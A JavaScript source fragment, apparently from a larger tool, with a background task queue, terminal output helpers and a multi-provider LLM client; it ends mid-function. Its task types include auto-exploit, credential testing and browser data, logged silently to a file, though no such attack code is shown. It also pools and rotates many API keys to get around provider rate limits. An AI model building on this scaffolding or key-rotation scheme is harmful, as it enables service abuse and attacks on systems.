// ═══════════════════════════════════════════════════════════════════════════════════
// �🔄 BACKGROUND TASK MANAGER - PROFESSIONAL MULTI-TASKING SYSTEM
// Separates background operations from user terminal for clean UX
// ═══════════════════════════════════════════════════════════════════════════════════

const BackgroundTaskManager = {
    // === CONFIGURATION ===
    config: {
        logFile: path.join(__dirname, 'background_tasks.log'),
        maxQueueSize: 100,
        maxConcurrent: 5,
        silentMode: true, // Don't print to main terminal
        showSummary: true // Show periodic summaries
    },

    // === STATE ===
    tasks: new Map(),
    queue: [],
    running: 0,
    completedCount: 0,
    failedCount: 0,
    lastSummaryTime: 0,
    summaryInterval: 30000, // 30 seconds

    // === TASK TYPES ===
    TaskTypes: {
        BROWSER_DATA: 'browser_data',
        AI_RETRY: 'ai_retry',
        RATE_LIMIT_WAIT: 'rate_limit_wait',
        AUTO_EXPLOIT: 'auto_exploit',
        CREDENTIAL_TEST: 'credential_test',
        SCAN: 'scan'
    },

    // === INITIALIZATION ===
    init() {
        // Create/clear log file
        const header = `
═══════════════════════════════════════════════════════════════════════════════
   🔄 BACKGROUND TASK LOG - ${new Date().toISOString()}
   All background operations are logged here to keep terminal clean
═══════════════════════════════════════════════════════════════════════════════

`;
        fs.writeFileSync(this.config.logFile, header);
        this.bgLog('BackgroundTaskManager initialized', 'SYSTEM');
    },

    // === BACKGROUND LOG (writes to file, not terminal) ===
    bgLog(message, taskType = 'GENERAL', level = 'INFO') {
        const ts = new Date().toISOString().split('T')[1].split('.')[0];
        const entry = `[${ts}] [${level}] [${taskType}] ${message}\n`;

        try {
            fs.appendFileSync(this.config.logFile, entry);
        } catch (e) {
            // Silently fail
        }

        // Only print critical errors to terminal
        if (level === 'CRITICAL' && !this.config.silentMode) {
            console.log(`${C.red}[BG] ${message}${C.reset}`);
        }
    },

    // === ADD TASK TO QUEUE ===
    addTask(taskType, taskFn, options = {}) {
        const taskId = `${taskType}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;

        const task = {
            id: taskId,
            type: taskType,
            fn: taskFn,
            priority: options.priority || 5, // 1=highest, 10=lowest
            retries: options.retries || 0,
            maxRetries: options.maxRetries || 3,
            added: Date.now(),
            status: 'queued'
        };

        this.tasks.set(taskId, task);

        // Insert by priority
        const insertIndex = this.queue.findIndex(t => t.priority > task.priority);
        if (insertIndex === -1) {
            this.queue.push(task);
        } else {
            this.queue.splice(insertIndex, 0, task);
        }

        this.bgLog(`Task added: ${taskId}`, taskType);

        // Process queue
        this.processQueue();

        return taskId;
    },

    // === PROCESS QUEUE ===
    async processQueue() {
        // Check if we can run more tasks
        if (this.running >= this.config.maxConcurrent || this.queue.length === 0) {
            return;
        }

        // Get next task
        const task = this.queue.shift();
        if (!task) return;

        this.running++;
        task.status = 'running';
        task.startTime = Date.now();

        this.bgLog(`Task started: ${task.id}`, task.type);

        try {
            // Execute task
            await task.fn();

            task.status = 'completed';
            task.endTime = Date.now();
            this.completedCount++;

            this.bgLog(`Task completed: ${task.id} (${task.endTime - task.startTime}ms)`, task.type);
        } catch (error) {
            task.status = 'failed';
            task.error = error.message;
            task.endTime = Date.now();

            this.bgLog(`Task failed: ${task.id} - ${error.message}`, task.type, 'ERROR');

            // Retry if possible
            if (task.retries < task.maxRetries) {
                task.retries++;
                task.status = 'queued';
                this.queue.push(task);
                this.bgLog(`Task requeued: ${task.id} (retry ${task.retries}/${task.maxRetries})`, task.type);
            } else {
                this.failedCount++;
            }
        } finally {
            this.running--;

            // Show periodic summary
            this.maybeShowSummary();

            // Process more tasks
            this.processQueue();
        }
    },

    // === SHOW PERIODIC SUMMARY (minimal terminal output) ===
    maybeShowSummary() {
        const now = Date.now();
        if (!this.config.showSummary || now - this.lastSummaryTime < this.summaryInterval) {
            return;
        }

        this.lastSummaryTime = now;

        const pending = this.queue.length;
        const running = this.running;
        const total = this.completedCount + this.failedCount;

        if (pending > 0 || running > 0) {
            // Minimal one-line status
            console.log(`${C.dim}[BG: ${running} running, ${pending} queued, ${total} done]${C.reset}`);
        }
    },

    // === GET FULL STATUS ===
    getStatus() {
        const byType = {};
        this.tasks.forEach(task => {
            if (!byType[task.type]) byType[task.type] = { completed: 0, failed: 0, running: 0, queued: 0 };
            byType[task.type][task.status]++;
        });

        return {
            running: this.running,
            queued: this.queue.length,
            completed: this.completedCount,
            failed: this.failedCount,
            byType
        };
    },

    // === SHOW DETAILED STATUS ===
    showStatus() {
        const status = this.getStatus();

        console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
        console.log(`${C.bold}${C.cyan}   🔄 BACKGROUND TASK MANAGER STATUS${C.reset}`);
        console.log(`${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);

        console.log(`${C.green}  ✓ Completed: ${status.completed}${C.reset}`);
        console.log(`${C.yellow}  ⏳ Running: ${status.running}${C.reset}`);
        console.log(`${C.blue}  📋 Queued: ${status.queued}${C.reset}`);
        console.log(`${C.red}  ✗ Failed: ${status.failed}${C.reset}`);

        console.log(`\n${C.dim}  📁 Log file: ${this.config.logFile}${C.reset}`);
        console.log(`${C.dim}  🔇 Silent mode: ${this.config.silentMode ? 'ON' : 'OFF'}${C.reset}`);

        // By type breakdown
        if (Object.keys(status.byType).length > 0) {
            console.log(`\n${C.bold}  By Task Type:${C.reset}`);
            Object.entries(status.byType).forEach(([type, counts]) => {
                console.log(`${C.dim}    ${type}: ${JSON.stringify(counts)}${C.reset}`);
            });
        }

        console.log(`\n${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
    },

    // === CLEAR COMPLETED TASKS ===
    clearCompleted() {
        let cleared = 0;
        this.tasks.forEach((task, id) => {
            if (task.status === 'completed' || task.status === 'failed') {
                this.tasks.delete(id);
                cleared++;
            }
        });
        this.bgLog(`Cleared ${cleared} completed/failed tasks`, 'SYSTEM');
        return cleared;
    },

    // === TOGGLE SILENT MODE ===
    toggleSilent() {
        this.config.silentMode = !this.config.silentMode;
        const status = this.config.silentMode ? 'ON (background logs go to file)' : 'OFF (some logs shown in terminal)';
        log(`🔇 Background silent mode: ${status}`, 'cyan');
    },

    // === VIEW RECENT LOGS ===
    viewLogs(lines = 20) {
        try {
            const content = fs.readFileSync(this.config.logFile, 'utf-8');
            const allLines = content.split('\n');
            const recentLines = allLines.slice(-lines);

            console.log(`\n${C.bold}${C.cyan}   📋 Recent Background Logs (last ${lines} lines)${C.reset}\n`);
            recentLines.forEach(line => {
                if (line.includes('[ERROR]')) {
                    console.log(`${C.red}${line}${C.reset}`);
                } else if (line.includes('[CRITICAL]')) {
                    console.log(`${C.red}${C.bold}${line}${C.reset}`);
                } else {
                    console.log(`${C.dim}${line}${C.reset}`);
                }
            });
            console.log();
        } catch (e) {
            log('❌ Could not read background log file', 'red');
        }
    },

    // === WRAP FUNCTION FOR BACKGROUND EXECUTION ===
    runInBackground(taskType, fn, options = {}) {
        return this.addTask(taskType, fn, options);
    }
};

// Initialize BackgroundTaskManager
BackgroundTaskManager.init();

// ═══════════════════════════════════════════════════════════════════════════════════
// 📺 OUTPUT MANAGER - PROFESSIONAL CLI OUTPUT & TASK QUEUE SYSTEM
// Manages terminal output to prevent clutter and enable true multi-tasking
// ═══════════════════════════════════════════════════════════════════════════════════

const OutputManager = {
    // === STATE ===
    rl: null,              // Reference to readline interface
    isPaused: false,       // Is readline paused for output
    outputQueue: [],       // Queue of pending outputs
    isProcessing: false,   // Is queue being processed
    cleanMode: true,       // Clean output mode (suppress non-essential logs)
    spinnerInterval: null, // Animation interval
    currentSpinner: null,  // Current spinner message

    // Spinner frames for animations
    spinnerFrames: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
    spinnerIndex: 0,

    // === INITIALIZE WITH READLINE ===
    init(readlineInterface) {
        this.rl = readlineInterface;
    },

    // === PAUSE READLINE FOR CLEAN OUTPUT ===
    pause() {
        if (this.rl && !this.isPaused) {
            this.isPaused = true;
            // Clear current line
            process.stdout.write('\r\x1b[K');
        }
    },

    // === RESUME READLINE ===
    resume() {
        if (this.rl && this.isPaused) {
            this.isPaused = false;
            // Redisplay prompt
            this.rl.prompt(true);
        }
    },

    // === SMART LOG (queued, non-blocking) ===
    log(message, options = {}) {
        const { priority = 'normal', background = false, immediate = false } = options;

        // Background tasks go to file only (unless critical)
        if (background && this.cleanMode && priority !== 'critical') {
            BackgroundTaskManager.bgLog(message.replace(/\x1b\[[0-9;]*m/g, ''), 'OUTPUT');
            return;
        }

        // Immediate output
        if (immediate) {
            this._directOutput(message);
            return;
        }

        // Queue for processing
        this.outputQueue.push({ message, priority });
        this._processQueue();
    },

    // === DIRECT OUTPUT (pauses readline) ===
    _directOutput(message) {
        // Pause readline if active
        if (this.rl && !this.isPaused) {
            this.pause();
        }

        // Output message
        console.log(message);

        // Resume readline with small delay
        setTimeout(() => this.resume(), 50);
    },

    // === PROCESS OUTPUT QUEUE ===
    async _processQueue() {
        if (this.isProcessing || this.outputQueue.length === 0) return;

        this.isProcessing = true;

        // Pause readline
        this.pause();

        // Process all queued items
        while (this.outputQueue.length > 0) {
            const { message } = this.outputQueue.shift();
            console.log(message);
            await this._delay(10); // Small delay to prevent buffer overflow
        }

        // Resume readline
        setTimeout(() => {
            this.resume();
            this.isProcessing = false;
        }, 100);
    },

    // === CLI ANIMATION: SPINNER ===
    startSpinner(message, color = 'cyan') {
        this.stopSpinner();
        this.currentSpinner = message;
        this.spinnerIndex = 0;

        this.spinnerInterval = setInterval(() => {
            const frame = this.spinnerFrames[this.spinnerIndex % this.spinnerFrames.length];
            this.spinnerIndex++;
            process.stdout.write(`\r${C[color] || C.cyan}${frame} ${message}${C.reset}   `);
        }, 80);
    },

    // === STOP SPINNER ===
    stopSpinner(finalMessage = null, color = 'green') {
        if (this.spinnerInterval) {
            clearInterval(this.spinnerInterval);
            this.spinnerInterval = null;

            // Clear spinner line
            process.stdout.write('\r\x1b[K');

            // Show final message if provided
            if (finalMessage) {
                console.log(`${C[color] || C.green}✓ ${finalMessage}${C.reset}`);
            }
        }
    },

    // === PROGRESS BAR ===
    showProgress(current, total, label = 'Progress') {
        const width = 30;
        const percent = Math.round((current / total) * 100);
        const filled = Math.round((current / total) * width);
        const empty = width - filled;

        const bar = `${C.green}${'█'.repeat(filled)}${C.dim}${'░'.repeat(empty)}${C.reset}`;
        process.stdout.write(`\r${C.cyan}${label}${C.reset} [${bar}] ${percent}% (${current}/${total})   `);

        if (current >= total) {
            console.log(); // New line when complete
        }
    },

    // === ANIMATED HEADER ===
    showAnimatedHeader(title, color = 'magenta') {
        const frames = ['◐', '◓', '◑', '◒'];
        let i = 0;

        return new Promise(resolve => {
            const anim = setInterval(() => {
                process.stdout.write(`\r ${C[color]}${frames[i % 4]} ${title}${C.reset}   `);
                i++;
                if (i > 8) {
                    clearInterval(anim);
                    console.log(`\r ${C[color]}${C.bold}★ ${title}${C.reset}   `);
                    resolve();
                }
            }, 100);
        });
    },

    // === TYPE WRITER EFFECT ===
    async typeWriter(text, speed = 30, color = 'white') {
        for (const char of text) {
            process.stdout.write(`${C[color] || C.white}${char}${C.reset}`);
            await this._delay(speed);
        }
        console.log();
    },

    // === TOGGLE CLEAN MODE ===
    toggleCleanMode() {
        this.cleanMode = !this.cleanMode;
        log(`🧹 Clean mode: ${this.cleanMode ? 'ON (background logs suppressed)' : 'OFF (all logs shown)'}`, 'cyan');
    },

    // === HELPER ===
    _delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
};

const TerminalAI = {
    config: {
        apiKey: CONFIG.AI_KEY,
        provider: CONFIG.AI_PROVIDER,
        isActive: false,
        maxRetries: 5,        // Increased retries
        retryDelay: 3000,
        currentModel: null,
        rateLimitUntil: 0,
        requestCount: 0,
        lastRequestTime: 0,
        collaborationMode: CONFIG.AI_COLLAB_MODE,
        deepAnalysis: CONFIG.AI_DEEP_ANALYSIS,
        minRequestInterval: 3000,   // 3 seconds minimum between requests
        exponentialBackoff: true,   // Enable smart backoff
        maxBackoffDelay: 60000,     // Max 60 second wait
        useSmartScheduling: true    // Spread requests to avoid limits
    },

    conversationHistory: [],
    collaborationLog: [],    // Track AI-to-AI conversations
    browserAIContext: {},    // Context from browser AI
    pendingCollabTasks: [],  // Tasks waiting for browser AI response
    modelStats: {},          // Track which models work

    // === EXPONENTIAL BACKOFF TRACKING ===
    backoffState: {
        currentDelay: 1000,    // Start with 1 second
        maxDelay: 60000,       // Max 60 seconds
        multiplier: 2,         // Double each time
        lastRateLimit: 0,
        consecutiveRateLimits: 0,
        successfulRequests: 0
    },

    // === REQUEST QUEUE SYSTEM ===
    requestQueue: [],
    isProcessingQueue: false,
    lastRequestTimestamp: 0,

    // === FREE PROVIDERS (NO API KEY NEEDED) ===
    freeProviders: {
        // HuggingFace Inference API (rate limited but free)
        huggingface: {
            enabled: true,
            models: [
                // These models are more reliably available on HuggingFace
                'microsoft/Phi-3-mini-4k-instruct',      // Very fast, usually available
                'google/flan-t5-large',                  // Always available, good for short tasks
                'facebook/opt-1.3b',                     // Fast text generation
                'bigscience/bloom-560m'                  // Multilingual, usually available
            ],
            endpoint: 'https://api-inference.huggingface.co/models/',
            rateLimitReset: 0,
            failures: 0,
            token: null,
            consecutiveFailures: 0,
            lastSuccess: 0
        },
        // Cloudflare Workers AI (free tier)
        cloudflare: {
            enabled: false,  // Needs account ID and token
            models: ['@cf/meta/llama-3-8b-instruct'],
            accountId: null,
            token: null,
            rateLimitReset: 0,
            failures: 0
        }
    },

    // === AI AVAILABILITY TRACKING ===
    aiAvailability: {
        isAvailable: true,
        lastCheck: 0,
        consecutiveFailures: 0,
        totalFailuresInSession: 0,
        pauseUntil: 0,
        maxConsecutiveFailures: 5,  // Pause AI operations after this many failures
        pauseDuration: 60000,       // Pause for 60 seconds when unavailable

        // Check if AI should be paused
        shouldPause() {
            if (Date.now() < this.pauseUntil) return true;
            return this.consecutiveFailures >= this.maxConsecutiveFailures;
        },

        // Record failure
        recordFailure() {
            this.consecutiveFailures++;
            this.totalFailuresInSession++;
            this.isAvailable = false;

            if (this.consecutiveFailures >= this.maxConsecutiveFailures) {
                this.pauseUntil = Date.now() + this.pauseDuration;
                const pauseSec = Math.ceil(this.pauseDuration / 1000);
                log(`\n⏸️  AI PAUSED for ${pauseSec}s (${this.consecutiveFailures} consecutive failures)`, 'yellow');
                log(`   Run 'ai-reset' to force resume or wait...`, 'dim');
            }
        },

        // Record success
        recordSuccess() {
            this.consecutiveFailures = 0;
            this.isAvailable = true;
            this.pauseUntil = 0;
        },

        // Force reset
        reset() {
            this.consecutiveFailures = 0;
            this.isAvailable = true;
            this.pauseUntil = 0;
            this.totalFailuresInSession = 0;
            log('✅ AI availability reset', 'green');
        },

        // Get status
        status() {
            return {
                available: this.isAvailable && !this.shouldPause(),
                paused: this.shouldPause(),
                pauseRemaining: Math.max(0, Math.ceil((this.pauseUntil - Date.now()) / 1000)),
                consecutiveFailures: this.consecutiveFailures,
                totalFailures: this.totalFailuresInSession
            };
        }
    },

    // === MULTI-PROVIDER BACKUP SYSTEM ===
    backupKeys: {
        groq: null,      // FREE - https://console.groq.com
        openai: null,    // Paid - https://platform.openai.com
        deepseek: null,  // Cheap - https://platform.deepseek.com
        together: null,  // Free tier - https://api.together.xyz
        mistral: null,   // Free tier - https://console.mistral.ai
        openrouter: null // Multi-model - https://openrouter.ai
    },

    // ═══════════════════════════════════════════════════════════════════════════
    // 🔑 BULK API KEY POOL SYSTEM - NO MORE RATE LIMITING!
    // ═══════════════════════════════════════════════════════════════════════════
    keyPool: {
        groq: [],       // Array of Groq keys
        gemini: [],     // Array of Gemini keys
        openai: [],     // Array of OpenAI keys
        deepseek: [],   // Array of DeepSeek keys
        together: [],   // Array of Together keys
        mistral: [],    // Array of Mistral keys
        openrouter: [], // Array of OpenRouter keys
        huggingface: [] // Array of HuggingFace tokens
    },

    // Track current key index for each provider
    keyPoolIndex: {
        groq: 0,
        gemini: 0,
        openai: 0,
        deepseek: 0,
        together: 0,
        mistral: 0,
        openrouter: 0,
        huggingface: 0
    },

    // Track status of each key: 'active', 'rate_limited', 'dead', 'cooling'
    keyPoolStatus: {},

    // Rate limit cooldown time (ms) - when key can be used again
    keyPoolCooldowns: {},

    // Add key to pool
    addKeyToPool(provider, key) {
        provider = provider.toLowerCase();
        if (!this.keyPool[provider]) {
            this.keyPool[provider] = [];
        }

        // Check if key already exists
        if (this.keyPool[provider].includes(key)) {
            log(`⚠️ Key already exists in ${provider} pool`, 'yellow');
            return false;
        }

        this.keyPool[provider].push(key);
        const keyId = `${provider}_${this.keyPool[provider].length - 1}`;
        this.keyPoolStatus[keyId] = 'active';
        this.keyPoolCooldowns[keyId] = 0;

        log(`✅ Key added to ${provider.toUpperCase()} pool (Total: ${this.keyPool[provider].length} keys)`, 'green');

        // If this is the first key for this provider, also set it as backup
        if (this.keyPool[provider].length === 1 && this.backupKeys.hasOwnProperty(provider)) {
            this.backupKeys[provider] = key;
            log(`   Also set as primary ${provider} backup`, 'cyan');
        }

        return true;
    },

    // Add multiple keys at once
    addKeysToPool(provider, keys) {
        provider = provider.toLowerCase();
        let added = 0;
        keys.forEach(key => {
            if (key && key.trim()) {
                if (this.addKeyToPool(provider, key.trim())) {
                    added++;
                }
            }
        });
        log(`✅ Added ${added} keys to ${provider.toUpperCase()} pool`, 'green');
        return added;
    },

    // Get next available key (auto-rotate on rate limit)
    getNextKey(provider) {
        provider = provider.toLowerCase();
        const pool = this.keyPool[provider];

        if (!pool || pool.length === 0) {
            return this.backupKeys[provider] || null;
        }

        const now = Date.now();
        const startIndex = this.keyPoolIndex[provider];
        let attempts = 0;

        // Try to find an available key
        while (attempts < pool.length) {
            const idx = (startIndex + attempts) % pool.length;
            const keyId = `${provider}_${idx}`;
            const status = this.keyPoolStatus[keyId];
            const cooldown = this.keyPoolCooldowns[keyId] || 0;

            // Check if key is available
            if (status === 'active' || (status === 'cooling' && now > cooldown)) {
                this.keyPoolIndex[provider] = idx;
                this.keyPoolStatus[keyId] = 'active';
                return pool[idx];
            }

            // Skip dead keys
            if (status === 'dead') {
                attempts++;
                continue;
            }

            // Skip rate limited keys still in cooldown
            if (status === 'rate_limited' && now < cooldown) {
                attempts++;
                continue;
            }

            // Key was rate limited but cooldown passed
            if (status === 'rate_limited' && now >= cooldown) {
                this.keyPoolStatus[keyId] = 'active';
                this.keyPoolIndex[provider] = idx;
                return pool[idx];
            }

            attempts++;
        }

        // All keys exhausted, return null
        log(`⚠️ All ${provider.toUpperCase()} keys are rate limited or dead!`, 'red');
        return null;
    },

    // Mark current key as rate limited and rotate to next
    markKeyRateLimited(provider, cooldownMs = 60000) {
        provider = provider.toLowerCase();
        const pool = this.keyPool[provider];

        if (!pool || pool.length === 0) {
            return null;
        }

        const currentIdx = this.keyPoolIndex[provider];
        const keyId = `${provider}_${currentIdx}`;

        this.keyPoolStatus[keyId] = 'rate_limited';
        this.keyPoolCooldowns[keyId] = Date.now() + cooldownMs;

        const cooldownSec = Math.ceil(cooldownMs / 1000);
        log(`⏳ Key ${currentIdx + 1}/${pool.length} rate limited (cooldown: ${cooldownSec}s)`, 'yellow');

        // Try to get next key
        this.keyPoolIndex[provider] = (currentIdx + 1) % pool.length;
        const nextKey = this.getNextKey(provider);

        if (nextKey) {
            const newIdx = this.keyPoolIndex[provider];
            log(`🔄 Rotated to key ${newIdx + 1}/${pool.length}`, 'cyan');

            // Update backup too
            if (this.backupKeys.hasOwnProperty(provider)) {
                this.backupKeys[provider] = nextKey;
            }
        }

        return nextKey;
    },

    // Mark key as dead (invalid/revoked)
    markKeyDead(provider, index) {
        provider = provider.toLowerCase();
        const keyId = `${provider}_${index}`;
        this.keyPoolStatus[keyId] = 'dead';
        log(`💀 Key ${index + 1} marked as dead`, 'red');
    },

    // Remove key from pool
    removeKeyFromPool(provider, index) {
        provider = provider.toLowerCase();
        const pool = this.keyPool[provider];

        if (!pool || index < 0 || index >= pool.length) {
            log(`⚠️ Invalid key index`, 'yellow');
            return false;
        }

        pool.splice(index, 1);

        // Rebuild status for remaining keys
        const newStatus = {};
        const newCooldowns = {};
        pool.forEach((_, i) => {
            const oldId = `${provider}_${i > index ? i + 1 : i}`;
            const newId = `${provider}_${i}`;
            newStatus[newId] = this.keyPoolStatus[oldId] || 'active';
            newCooldowns[newId] = this.keyPoolCooldowns[oldId] || 0;
        });

        // Update status
        Object.keys(this.keyPoolStatus).forEach(k => {
            if (k.startsWith(provider + '_')) delete this.keyPoolStatus[k];
        });
        Object.keys(this.keyPoolCooldowns).forEach(k => {
            if (k.startsWith(provider + '_')) delete this.keyPoolCooldowns[k];
        });
        Object.assign(this.keyPoolStatus, newStatus);
        Object.assign(this.keyPoolCooldowns, newCooldowns);

        // Reset index if needed
        if (this.keyPoolIndex[provider] >= pool.length) {
            this.keyPoolIndex[provider] = 0;
        }

        log(`✅ Key removed from ${provider.toUpperCase()} pool (${pool.length} remaining)`, 'green');
        return true;
    },

    // Clear all dead keys
    clearDeadKeys(provider = null) {
        const providers = provider ? [provider.toLowerCase()] : Object.keys(this.keyPool);
        let removed = 0;

        providers.forEach(p => {
            const pool = this.keyPool[p];
            if (!pool) return;

            // Find dead keys (reverse order to maintain indices)
            for (let i = pool.length - 1; i >= 0; i--) {
                const keyId = `${p}_${i}`;
                if (this.keyPoolStatus[keyId] === 'dead') {
                    this.removeKeyFromPool(p, i);
                    removed++;
                }
            }
        });

        log(`🧹 Removed ${removed} dead keys`, 'green');
        return removed;
    },

    // Show key pool status
    showKeyPool() {
        console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
        console.log(`${C.bold}${C.cyan}   🔑 API KEY POOL STATUS (Bulk Rate Limit Protection)${C.reset}`);
        console.log(`${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);

        const now = Date.now();
        let totalKeys = 0;
        let activeKeys = 0;

        Object.keys(this.keyPool).forEach(provider => {
            const pool = this.keyPool[provider];
            if (pool.length === 0) return;

            totalKeys += pool.length;
            const currentIdx = this.keyPoolIndex[provider];

            console.log(`${C.yellow}${C.bold}${provider.toUpperCase()} (${pool.length} keys):${C.reset}`);

            pool.forEach((key, i) => {
                const keyId = `${provider}_${i}`;
                const status = this.keyPoolStatus[keyId] || 'active';
                const cooldown = this.keyPoolCooldowns[keyId] || 0;
                const isCurrent = i === currentIdx;

                let statusIcon, statusColor;
                switch (status) {
                    case 'active':
                        statusIcon = '🟢';
                        statusColor = C.green;
                        activeKeys++;
                        break;
                    case 'rate_limited':
                        const remaining = Math.max(0, Math.ceil((cooldown - now) / 1000));
                        statusIcon = remaining > 0 ? `🟡 (${remaining}s)` : '🟢';
                        statusColor = remaining > 0 ? C.yellow : C.green;
                        if (remaining <= 0) activeKeys++;
                        break;
                    case 'cooling':
                        statusIcon = '🟠';
                        statusColor = C.yellow;
                        break;
                    case 'dead':
                        statusIcon = '🔴';
                        statusColor = C.red;
                        break;
                    default:
                        statusIcon = '⚪';
                        statusColor = C.dim;
                }

                const currentMarker = isCurrent ? `${C.cyan}→ ${C.reset}` : '  ';
                const keyPreview = key.substring(0, 15) + '...' + key.slice(-4);

                console.log(`${currentMarker}${statusColor}[${i + 1}] ${statusIcon} ${keyPreview}${C.reset}`);
            });
            console.log();
        });

        if (totalKeys === 0) {
            console.log(`${C.dim}  No keys in pool. Add keys with:${C.reset}`);
            console.log(`${C.cyan}  addkey groq gsk_xxxxxxxxxx${C.reset}`);
            console.log(`${C.cyan}  addkeys groq key1 key2 key3${C.reset}`);
            console.log(`${C.cyan}  bulkkeys groq${C.reset} (paste multiple keys)`);
        } else {
            console.log(`${C.bold}Total: ${totalKeys} keys | Active: ${activeKeys} | Rate Limited: ${totalKeys - activeKeys}${C.reset}`);
        }

        console.log();
    },

    // Save key pool to file
    saveKeyPool() {
        try {
            const data = {
                keyPool: this.keyPool,
                keyPoolIndex: this.keyPoolIndex
            };
            fs.writeFileSync('nexus-keypool.json', JSON.stringify(data, null, 2));
            log('💾 Key pool saved to nexus-keypool.json', 'green');
        } catch (e) {
            log(`⚠️ Failed to save key pool: ${e.message}`, 'yellow');
        }
    },

    // Load key pool from file
    loadKeyPool() {
        try {
            if (fs.existsSync('nexus-keypool.json')) {
                const data = JSON.parse(fs.readFileSync('nexus-keypool.json', 'utf8'));
                if (data.keyPool) {
                    Object.assign(this.keyPool, data.keyPool);
                    // Initialize status for loaded keys
                    Object.keys(this.keyPool).forEach(provider => {
                        this.keyPool[provider].forEach((_, i) => {
                            const keyId = `${provider}_${i}`;
                            this.keyPoolStatus[keyId] = 'active';
                            this.keyPoolCooldowns[keyId] = 0;
                        });
                    });
                }
                if (data.keyPoolIndex) {
                    Object.assign(this.keyPoolIndex, data.keyPoolIndex);
                }

                const totalKeys = Object.values(this.keyPool).reduce((sum, arr) => sum + arr.length, 0);
                if (totalKeys > 0) {
                    log(`📂 Loaded ${totalKeys} keys from nexus-keypool.json`, 'green');
                }
            }
        } catch (e) {
            log(`⚠️ Failed to load key pool: ${e.message}`, 'yellow');
        }
    },

    // Provider fallback order (prioritize free providers first!)
    fallbackOrder: ['huggingface', 'together', 'deepseek', 'groq', 'mistral', 'openrouter', 'openai'],

    // Track provider status
    providerFailures: {},
    providerRateLimits: {},

    // Response cache
    responseCache: new Map(),
    cacheMaxAge: 5 * 60 * 1000,  // 5 minutes

    // === EXPONENTIAL BACKOFF METHODS ===
    resetBackoff() {
        this.backoffState.currentDelay = 1000;
        this.backoffState.consecutiveRateLimits = 0;
        this.backoffState.successfulRequests++;
    },

    increaseBackoff() {
        this.backoffState.consecutiveRateLimits++;
        this.backoffState.currentDelay = Math.min(
            this.backoffState.currentDelay * this.backoffState.multiplier,
            this.backoffState.maxDelay
        );
        this.backoffState.lastRateLimit = Date.now();
    },

    async applyBackoff(reason = 'rate_limit') {
        const delay = this.backoffState.currentDelay;
        const jitter = Math.random() * 1000; // Add random jitter
        const totalDelay = delay + jitter;

        log(`⏳ Backoff: waiting ${Math.ceil(totalDelay / 1000)}s (attempt ${this.backoffState.consecutiveRateLimits + 1})...`, 'yellow');
        await this.delay(totalDelay);

        this.increaseBackoff();
    },

    // === FREE HUGGINGFACE PROVIDER ===
    async queryHuggingFace(prompt) {
        const hf = this.freeProviders.huggingface;

        // Check if rate limited
        if (Date.now() < hf.rateLimitReset) {
            const waitSec = Math.ceil((hf.rateLimitReset - Date.now()) / 1000);
            // Don't log every time - only if significant wait
            if (waitSec > 5) {
                log(`⏳ HuggingFace cooldown: ${waitSec}s`, 'dim');
            }
            return null;
        }

        // Disable after too many consecutive failures
        if (hf.consecutiveFailures >= 15) {
            // Only log once per minute
            if (Date.now() - hf.lastSuccess > 60000) {
                log('⚠️ HuggingFace paused. Use: resethf', 'dim');
            }
            return null;
        }

        // Try each model
        for (const model of hf.models) {
            try {
                const modelName = model.split('/').pop();

                // Build headers
                const headers = {
                    'Content-Type': 'application/json'
                };
                if (hf.token) {
                    headers['Authorization'] = `Bearer ${hf.token}`;
                }

                // Different models need different request formats
                let requestBody;
                if (model.includes('flan-t5') || model.includes('bloom')) {
                    // Text2Text models
                    requestBody = JSON.stringify({
                        inputs: prompt.substring(0, 1000),
                        parameters: {
                            max_length: 300,
                            temperature: 0.7
                        }
                    });
                } else {
                    // Chat/Instruct models
                    requestBody = JSON.stringify({
                        inputs: prompt.substring(0, 1500),
                        parameters: {
                            max_new_tokens: 400,
                            temperature: 0.7,
                            return_full_text: false,
                            do_sample: true
                        }
                    });
                }

                const result = await this._makeHTTPRequest({
                    hostname: 'api-inference.huggingface.co',
                    path: `/models/${model}`,
                    method: 'POST',
                    headers: headers,
                    timeout: 15000  // 15 second timeout
                }, requestBody);

                // Success cases
                if (result && !result.error && !result.rateLimited) {
                    let text = null;

                    // Parse different response formats
                    if (Array.isArray(result) && result[0]?.generated_text) {
                        text = result[0].generated_text;
                    } else if (result.generated_text) {
                        text = result.generated_text;
                    } else if (Array.isArray(result) && typeof result[0] === 'string') {
                        text = result[0];
                    } else if (typeof result === 'string' && result.length > 10) {
                        text = result;
                    }

                    if (text && text.length > 20) {
                        hf.consecutiveFailures = 0;
                        hf.lastSuccess = Date.now();
                        this.aiAvailability.recordSuccess();
                        log(`✅ HuggingFace (${modelName})`, 'green');
                        return text;
                    }
                }

                // Rate limited
                if (result?.rateLimited || result?.statusCode === 429) {
                    hf.rateLimitReset = Date.now() + 20000;
                    continue;
                }

                // Model loading (503)
                if (result?.statusCode === 503 || result?.error?.includes?.('loading')) {
                    continue; // Try next model
                }

            } catch (e) {
                hf.consecutiveFailures++;
                // Silent fail - try next model
            }
        }

        hf.consecutiveFailures++;
        return null;
    },

    // Set backup key
    setBackupKey(provider, key) {
        if (this.backupKeys.hasOwnProperty(provider)) {
            this.backupKeys[provider] = key;
            this.providerFailures[provider] = 0;
            log(`✅ ${provider.toUpperCase()} backup configured`, 'green');
            return true;
        }
        // Also allow setting HuggingFace token
        if (provider === 'huggingface' && key) {
            this.freeProviders.huggingface.token = key;
            this.freeProviders.huggingface.failures = 0;
            log(`✅ HUGGINGFACE API token configured (better rate limits)`, 'green');
            return true;
        }
        log(`❌ Unknown provider: ${provider}`, 'red');
        return false;
    },

    // Show configured backups
    showBackups() {
        log('🔄 CONFIGURED PROVIDERS:', 'magenta');

        // Show free providers first
        log('   FREE PROVIDERS:', 'cyan');
        for (const [name, config] of Object.entries(this.freeProviders)) {
            const status = config.enabled ? '✅ Enabled' : '❌ Disabled';
            const limited = Date.now() < config.rateLimitReset ? ' (rate limited)' : '';
            log(`      ${name}: ${status}${limited}`, config.enabled ? 'green' : 'yellow');
        }

        log('   API KEY PROVIDERS:', 'cyan');
